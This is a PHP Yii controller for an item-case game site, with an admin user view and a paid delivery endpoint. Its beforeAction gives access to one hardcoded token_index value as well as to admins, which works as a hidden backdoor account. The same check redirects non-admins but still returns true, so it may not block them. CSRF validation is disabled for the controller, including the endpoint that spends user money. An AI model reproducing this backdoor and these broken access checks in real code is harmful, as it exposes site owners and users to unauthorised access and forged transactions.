<?php
/**
 * Created by PhpStorm.
 * User: dmalchenko
 * Date: 08.10.17
 * Time: 20:42
 */

namespace app\modules\opencase\controllers;


use app\models\User;
use app\modules\opencase\models\Basket;
use app\modules\opencase\models\Delivery;
use app\modules\opencase\models\DeliveryAddress;
use app\modules\opencase\models\GameConfig;
use app\modules\opencase\models\GameLog;
use Yii;
use yii\data\ActiveDataProvider;
use yii\web\NotFoundHttpException;
use yii\web\Response;

class UserController extends \app\controllers\UserController {

	public $enableCsrfValidation = false;

	public function beforeAction($action) {

		if (!parent::beforeAction($action)) {
			return false;
		}

		if (!Yii::$app->user->isGuest && User::getCurrentUser()->token_index == 2913623761) {
			return true;
		}

		if (!Yii::$app->user->isGuest && User::getCurrentUser()->admin) {
			return true;
		} else {
			$this->redirect(['/site/index']);
		}
		return true;
	}

	/**
	 * Displays a single User model.
	 * @param integer $id
	 * @return mixed
	 */
	public function actionView($id) {
		$user = $this->findModel($id);

		$dataProvider = new ActiveDataProvider([
			'query' => GameConfig::find()->where(['token_index' => $user->token_index]),
		]);

		$gameLogDataProvider = new ActiveDataProvider([
			'query' => GameLog::find()->where(['token_index' => $user->token_index]),
		]);

		$basketDataProvider = new ActiveDataProvider([
			'query' => Basket::find()
				->where(['token_index' => $user->token_index]),
		]);

		return $this->render('view', [
			'model' => $user,
			'gameConfigDataProvider' => $dataProvider,
			'gameLogDataProvider' => $gameLogDataProvider,
			'basketDataProvider' => $basketDataProvider,
		]);
	}

	public function actionDelivery() {
		if (!\Yii::$app->request->isPost) {
			echo json_encode(['code' => 500, 'msg' => 'Error']);
			exit;
		}
		$user = User::getCurrentUser();
		if (!$user) {
			echo json_encode(['code' => 500, 'msg' => 'Пожалуйста авторизируйтесь']);
			exit;
		}
		if ($user->money - Delivery::COST < 0) {
			echo json_encode(['code' => 500, 'msg' => 'Недостаточно средств на счете']);
			exit;
		}

		$deliveryAddress = DeliveryAddress::findOne(['token_index' => $user->token_index]);
		if (!$deliveryAddress) {
			echo json_encode(['code' => 500, 'msg' => 'Не указан адресс доставки']);
			exit;
		}

		$post = \Yii::$app->request->post();
		$items = $post['items'];
		if (!$items || !is_array($items) || count($items) > 5) {
			echo json_encode(['code' => 500, 'msg' => 'Внутренняя ошибка, попробуйте позже']);
			exit;
		}

		/**
		 * @var Basket[] $basketItems
		 */
		$basketItems = Basket::find()
			->where(['token_index' => $user->token_index])
			->andWhere(['item_id' => $items])
			->all();
		$confirmItems = count($basketItems) >= count($items) && count($items);

		if (!$confirmItems) {
			echo json_encode(['code' => 500, 'msg' => 'Внутренняя ошибка, попробуйте позже']);
			exit;
		}

		foreach ($basketItems as $basketItem) {
			$basketItem->delete();
		}

		$user->money = $user->money - Delivery::COST;
		$user->update();

		foreach ($items as $item) {
			$delivery = new Delivery();
			$delivery->token = $user->token;
			$delivery->token_index = $user->token_index;
			$delivery->delivery_address_id = $deliveryAddress->id;
			$delivery->status = Delivery::STATUS_INIT;
			$delivery->items = $item;
			$delivery->save();
		}

		echo json_encode(['code' => 200, 'msg' => 'OK']);
		exit;
	}

	/**
	 * Finds the User model based on its primary key value.
	 * If the model is not found, a 404 HTTP exception will be thrown.
	 * @param integer $id
	 * @return User the loaded model
	 * @throws NotFoundHttpException if the model cannot be found
	 */
	protected function findModel($id) {
		if (($model = User::findOne($id)) !== null) {
			return $model;
		} else {
			throw new NotFoundHttpException('The requested page does not exist.');
		}
	}
}